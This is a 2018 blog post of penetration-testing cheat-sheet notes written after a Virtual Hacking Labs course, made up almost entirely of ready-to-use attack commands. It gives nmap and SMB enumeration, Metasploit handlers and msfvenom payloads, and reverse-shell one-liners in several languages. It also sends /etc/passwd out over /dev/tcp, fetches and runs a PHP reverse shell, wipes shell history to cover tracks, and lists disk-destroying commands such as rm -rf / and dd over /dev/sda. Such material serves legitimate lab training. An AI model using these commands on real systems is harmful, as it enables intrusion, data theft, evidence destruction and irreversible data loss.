<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" class="no-js">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      Virtual Hacking Labs Notes &middot; M
    
  </title>

  
    <meta name="description" content="VHL laboratory machines notes"/>
    <meta name="keywords" content="vhl pentesting">
  
  <meta name="author" content="Heiswayi Nrird">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="@1_mod_m">
  <meta name="twitter:creator" content="@1_mod_m">
  
    <meta name="twitter:title" content="Virtual Hacking Labs Notes">
    <meta name="twitter:description" content="VHL laboratory machines notes">
  

  <meta property="og:type" content="website"/>
  
    <meta property="og:title" content="Virtual Hacking Labs Notes"/>
    <meta property="og:url" content="https://1modm.github.io/VHL-notes.html"/>
    <meta property="og:description" content="VHL laboratory machines notes"/>
    <meta property="og:site_name" content="Virtual Hacking Labs Notes"/>
  

  <link rel="apple-touch-icon" sizes="57x57" href="https://1modm.github.io/public/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="https://1modm.github.io/public/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="https://1modm.github.io/public/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="https://1modm.github.io/public/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="https://1modm.github.io/public/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="https://1modm.github.io/public/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="https://1modm.github.io/public/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="https://1modm.github.io/public/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://1modm.github.io/public/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192" href="https://1modm.github.io/public/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://1modm.github.io/public/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="https://1modm.github.io/public/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://1modm.github.io/public/icons/favicon-16x16.png">
  <link rel="manifest" href="https://1modm.github.io/public/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#f3f3f3">
  <meta name="msapplication-TileImage" content="https://1modm.github.io/public/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">
  <meta name="google-site-verification" content="aSavCGGU0uSN5HEHnI7ZiMqVKxn7mfUPCGMVJvmDQ1w" />
  <meta name="wot-verification" content="6da2597a332a1fadad8f"/>

  <link rel="alternate" type="application/rss+xml" title="RSS" href="https://1modm.github.io/atom.xml">

  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://1modm.github.io/public/css/normalize.css">
  <link rel="stylesheet" href="https://1modm.github.io/public/css/style.css">

  <script src="https://1modm.github.io/public/js/modernizr.custom.js"></script>
  <script src="https://1modm.github.io/public/js/jquery-1.11.2.min.js"></script>
  <script src="https://1modm.github.io/public/js/masonry.pkgd.min.js"></script>

  <!--[if lt IE 9]>
    <script src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.1.0/respond.min.js"></script>
    <script src="https://1modm.github.io/public/js/rem.min.js"></script>
  <![endif]-->
</head>


  <body>

    <div class="wrap">
      <div class="master-nav">
        <div class="nav">
            <ul class="top-menu">
              <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
              <li><a href="/about.html"><i class="fa fa-info-circle"></i> About</a></li>
              <li><a href="/notes.html"><i class="fa fa-pencil"></i> Posts</a></li>
              <li><a class="resume" href="https://1modm.github.io/documentation/"><i class="fa fa-file-text-o"></i> Notes</a></li>
              <li><a class="special" href="https://github.com/1modm?tab=repositories"><i class="fa fa-github-alt"></i> Repositories</a></li>

            </ul>
        </div>
      </div>

      <div class="masthead">
        <div class="container">
          <h2 class="masthead-title">
            <a href="/" title="Home">M</a>
            <small></small>
          </h2>

          <div class="footer-social-links">
  <a href="https://www.linkedin.com/in/mmorillo" title="LinkedIn" target="_blank"><i class="fa fa-linkedin"></i></a>
  <a href="https://twitter.com/1_mod_m" title="Twitter" target="_blank"><i class="fa fa-twitter"></i></a>
  <a href="https://github.com/1modm" title="GitHub" target="_blank"><i class="fa fa-github-alt"></i></a>
</div>


        </div>
      </div>

      <div class="container content">
        <div class="post">
  <div class="post-top-meta">
    <div class="post-date">March 17, 2018 &middot; <span class="reading-time" title="Estimated Reading Time">
  
  
    4 minutes read
  
</span>
</div>
    <h1 class="post-title">Virtual Hacking Labs Notes</h1>
  </div>

  <div class="hrline"></div>

  <p>Recently I tried and passed (Certificate ID: 1837845437) the course Penetration Testing Course by Virtual Hacking Labs in which you need to complete at least 20 lab machines successfully in their virtual environment. <a href="https://www.virtualhackinglabs.com/reviews/">Reviews</a>.</p>

<p>The environment is very easy to use, using a VM with parrot or kali to complete/exploit as much servers as possible, nice and good documentation and guides. Totally recommended, if you want to learn doing something more than read.</p>

<h3 id="information-gathering">Information Gathering</h3>

<p><strong>DNS</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>﻿nslookup -type=any &lt;DOMAIN&gt;
host -t axfr -l &lt;DOMAIN&gt; &lt;DNSSERVER&gt;
dig -t mx &lt;DOMAIN&gt;
dig -t any &lt;DOMAIN&gt;
</code></pre>
</div>

<p><strong>Nmap</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code># Service discovery
nmap -sV &lt;IP&gt;
nmap -sV -O &lt;IP&gt;
nmap -p 1-65535 -T4 -A -v -Pn &lt;IP&gt;

# Host discovery
nmap -sn &lt;NETWORK&gt;

# TCP connect scan
nmap -sT &lt;IP&gt;

# TCP SYN scan
nmap -sS &lt;IP&gt;

# TCP ACK scan
nmap -sA &lt;IP&gt;

# TCP Window scan
nmap -sW &lt;IP&gt;

# TCP Maimon scan
nmap -sM &lt;IP&gt;

## TCP Null Scan to fool a firewall to generate a response
## Does not set any bits (TCP flag header is 0)
nmap -sN &lt;IP&gt;
 
## TCP Fin scan to check firewall
## Sets just the TCP FIN bit
nmap -sF &lt;IP&gt;
 
## TCP Xmas scan to check firewall
## Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree
nmap -sX &lt;IP&gt;

# UDP port scanning
nmap -sU &lt;IP&gt;
nmap -sU -sS -p U:137-139,T:137-139,445 &lt;IP&gt;

# Aggressive scan
nmap -A &lt;IP&gt;

# Read the list of targets using a text file
nmap -iL IPs.txt

# Excluding hosts/networks
nmap &lt;NETWORK&gt; --exclude &lt;IP&gt; &lt;IP&gt;

# Scripting
nmap -p 139,445 --script=smb-vuln* &lt;IP&gt;
nmap -sV --script http-wordpress-enum --script-args limit=25 &lt;IP&gt;
nmap --script ftp-vsftpd-backdoor –p 21 &lt;IP&gt;
nmap -sV -script irc-unrealircd-backdoor -p 6667 &lt;IP&gt;

# Show all packets sent and received
nmap --packet-trace -p 22 &lt;IP&gt;

# Show host interfaces and routes
nmap --iflist

# Scan IPv6
nmap -6 &lt;IPv6&gt;
nmap -v A -6 &lt;IPv6&gt;

# Save output
nmap -oN &lt;FILE&gt; &lt;IP&gt;
</code></pre>
</div>

<p><strong>MyIP</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>wget -qO- http://ipecho.net/plain; echo
</code></pre>
</div>

<p><strong>SMB</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>smbclient -L &lt;IP&gt;
rpcclient -U "" &lt;IP&gt;
smbclient -U &lt;HOST&gt; -L &lt;IP&gt;
/usr/bin/smbclient \\\\&lt;IP&gt;\\share &lt;HOST&gt;
</code></pre>
</div>

<h3 id="exploitation">Exploitation</h3>

<p><a href="https://www.exploit-db.com/">Exploit DB</a></p>

<p><strong>Search Exploits</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>nikto -h &lt;http://IP&gt;
searchsploit
sudo wpscan --url &lt;IP&gt;
</code></pre>
</div>

<h3 id="metasploit">Metasploit</h3>

<p><strong>Listener</strong></p>

<ul>
  <li>Windows</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp 
msf exploit(handler) &gt; set LHOST &lt;IP&gt; 
lhost =&gt; &lt;IP&gt;
msf exploit(handler) &gt; set LPORT 4444 
lport =&gt; 4444 
msf exploit(handler) &gt; run
</code></pre>
</div>

<ul>
  <li>Linux</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>msf payload(linux/x86/meterpreter/reverse_tcp) &gt; use exploit/multi/handler 
msf exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp 
payload =&gt; linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set LHOST &lt;IP&gt;
LHOST =&gt; &lt;IP&gt;
msf exploit(multi/handler) &gt; run
</code></pre>
</div>

<p><strong>msfvenom</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f war &gt; shell.war
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f elf &gt; shell.elf
</code></pre>
</div>

<h3 id="privilege-escalation">Privilege escalation</h3>

<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Linux privilege escalation notes</a></p>

<p><a href="https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/">Windows privilege escalation notes</a>
<a href="http://toshellandback.com/2015/11/24/ms-priv-esc/">Common Windows Privilege Escalation Vectors</a></p>

<p><strong>Check port</strong></p>

<p>lsof +c 0 -i:40001 -n</p>

<h3 id="reverse-shells">Reverse Shells</h3>

<p><strong>Upgrade shell</strong></p>
<div class="highlighter-rouge"><pre class="highlight"><code>python -c 'import pty; pty.spawn("/bin/bash");'
</code></pre>
</div>

<p><strong>Listener</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>nc -lvp 4444
</code></pre>
</div>

<p><strong>Target</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code># Bash
bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1

# Perl
perl -e 'use Socket;$i="&lt;IP&gt;";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("&lt;IP&gt;",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;IP&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("&lt;IP&gt;",80).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'

# Netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; 4444 &gt;/tmp/f
nc -e /bin/sh &lt;IP&gt; 444

# sh
0&lt;&amp;196; exec 196&lt;&gt;/dev/tcp/&lt;IP&gt;/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196

# Socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;IP&gt;:4444 
</code></pre>
</div>

<h3 id="bind-shell">Bind Shell</h3>

<p><strong>Target</strong></p>
<div class="highlighter-rouge"><pre class="highlight"><code># Windows
nc -lvp 4444 -e cmd.exe

# Linux
nc -lvp 4444 -e /bin/sh
</code></pre>
</div>

<p><strong>Attacker</strong></p>
<div class="highlighter-rouge"><pre class="highlight"><code>nc &lt;IP&gt; 4444
</code></pre>
</div>

<h3 id="sending-files">Sending files</h3>

<div class="highlighter-rouge"><pre class="highlight"><code>exec 3&lt;&gt;/dev/tcp/&lt;IP&gt;/4444 &amp;&amp; cat /etc/passwd&gt;&amp;3
</code></pre>
</div>

<p><strong>With Netcat</strong></p>

<p>Listener:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>netcat -l 4444 &gt; received_file
</code></pre>
</div>

<p>Target:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>netcat &lt;IP&gt; 4444 &lt; original_file
</code></pre>
</div>

<p>Listener:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>netcat -l 4444 | tar xzvf -
</code></pre>
</div>

<p>Target:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>tar -czf - * | netcat &lt;IP&gt; 4444
</code></pre>
</div>

<h3 id="file-upload-in-windows-with-powershell">File upload in Windows with PowerShell</h3>

<p><a href="https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/">[Windows / DOS / PowerShell] File upload in command line</a></p>

<h3 id="php-web-and-reverse-shells">PHP web and reverse shells</h3>

<p><a href="https://github.com/JohnTroony/php-webshells">php-webshells</a></p>

<div class="highlighter-rouge"><pre class="highlight"><code>wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;&amp; php -f /tmp/php_shell.php
</code></pre>
</div>

<p><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></p>

<p><a href="https://www.whitewinterwolf.com/posts/2017/12/02/wwwolfs-php-webshell-users-guide/">whitewinterwolf php webshell</a></p>

<h3 id="covering-the-tracks">Covering the tracks</h3>

<p><strong>Avoiding history</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>export HISTFILE=
</code></pre>
</div>
<div class="highlighter-rouge"><pre class="highlight"><code>unset HISTFILE
</code></pre>
</div>

<p><strong>Clear history</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>rm -rf .bash_history 
touch .bash_history (invasive)
history -c
set +o history
</code></pre>
</div>

<p><strong>Destroy</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>rm -rf / 
find / -type f -exec {} 
mkfs.ext3 /dev/sda
dd if=/dev/zero of=/dev/sda bs=1M
</code></pre>
</div>

<h3 id="resources">Resources</h3>

<p><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escaping-restricted-linux-shells</a></p>

<p><a href="https://www.kernel-exploits.com/">kernel-exploits</a></p>

<p><a href="https://github.com/andrew-d/static-binaries">static-binaries</a></p>

<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></p>

<p><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#linux-penetration-testing-commands">Linux Penetration Testing Commands</a></p>


  
</div>
<div class="back"><a href="/notes.html"><i class="fa fa-chevron-left"></i> Back</a></div>

      </div>
    </div>

	  <div class="footer">
	<div class="hrline"></div>

	<div class="copyright">Made with <span style="color:#e00"><i class="fa fa-heart"></i></span> using <a href="http://jekyllrb.com">Jekyll</a> &middot; <i class="fa fa-code"></i> on <a href="https://github.com/heiswayi/heiswayi.github.io_jekyll_source">GitHub</a> <i class="fa fa-github-alt"></i><br>&copy; 2018 </div>
</div>

<script>
$(window).load(function() {
	$('.grid').masonry({
		itemSelector: '.grid-item',
		columnWidth: '.grid-sizer',
		gutter: 10
	});
});
</script>


	<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-xxxx', 'auto');
  ga('send', 'pageview');
</script>




  </body>
</html>
